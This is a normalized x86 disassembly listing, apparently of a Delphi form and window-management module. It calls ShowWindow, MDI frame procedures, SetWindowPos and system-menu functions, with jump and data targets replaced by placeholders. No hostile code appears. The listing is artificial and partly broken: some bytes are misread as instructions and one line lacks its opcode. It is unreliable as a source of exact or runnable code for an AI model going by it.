cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_45a964
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45a964
mov edx eax
mov eax ebx
call sub_43fd50
mov edx 0xff00000f
mov eax ebx
call sub_43fd50
pop ebx
retn
sub_45aa00
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_446450
push eax
call ShowWindow
sub_45aa40
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_45a458
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_45a458
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45decc
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45deb8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_45a458
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45decc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45deb8
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbbc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dba0
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45db88
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45deb8
call sub_45db88
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45db88
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbd4
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbbc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dba0
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45db88
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbd4
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbbc
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbbc
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbbc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dba0
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45db88
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbd4
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45db88
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbd4
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dbbc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45deb8
call sub_45dba0
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_45ad94
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_458250
mov edx esi
mov eax edi
call sub_45d738
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45ae43 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4431f0
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4431f0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_45afa5
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_458260
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov eax ebx
call sub_45b904
push eax
push 0x1
push 0x80
mov eax ebx
call sub_446450
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43f5b4
push eax
mov eax ebx
call sub_43f5f8
push eax
mov eax ebx
call sub_446450
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406d1c
mov [ ebx + 0x254 ] eax
push ebx
push sub_459ef0
call sub_41f768
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_450254
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_446450
push eax
call SetWindowPos
jmp r-xdata
sub_45b0f2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45b21d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_443554
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45d610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b224
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_45b22c
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_4437c0
push 0x0
mov eax ebx
call sub_446450
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_45b270
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443f44
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_446450
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_446450
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45b2d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b37c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b383
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax edi
call sub_457570
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403368
mov eax ebx
call sub_45b68c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403368
test al al
jne r-xdata
sub_45b38c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_442ea8
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_442ea8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45b2d4
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45b3d4
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45b2d4
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45b3f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_418030
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_417f10
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_418030
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_417f10
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_45b668
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_446450
mov dx 0xb000
call sub_457338
test al al
jne r-xdata
call sub_446450
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_457338
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b66f
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_4039a4
jmp r-xdata
call sub_4039a4
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_442ea8
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_446450
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_457338
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_440d98
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
call sub_4039a4
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_446450
mov dx 0xb01a
call sub_457338
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_4039a4
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_440d98
sub_45b68c
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_440d98
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_446450
push eax
call SetFocus
mov eax ebx
call sub_446450
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45b6dc
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_440d98
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45b790
mov eax esi
call sub_45b68c
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_446878
mov edx eax
mov eax esi
call sub_45b2d4
sub_45b740
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45a358
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_440d98
mov eax ebx
call sub_45a358
mov edx esi
call sub_45b740
sub_45b790
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_453d80
mov edx esi
call sub_453d64
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45b838
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_446450
push eax
call SendMessageA
sub_45b884
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45b838
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45b8b4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45b838
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_45b920
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_422644
xor eax eax
push ebp
push sub_45b9ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_422a70
xor eax eax
push ebp
push sub_45b9ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403368
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b9b2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_422a70
retn
sub_45b9dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_45a358
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_45a38c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403368
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_445718
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_45a3d8
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403368
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_45ba7c
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_446450
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_446450
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45b904
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_446450
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44455c
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45bafa
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_42222c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45bb5c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_446450
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_444820
pop edi
pop esi
retn
sub_45bba8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45bca4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_45a6cc
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_45bba8
pop ecx
sub_45bcd8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_4412b4
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446450
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446450
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
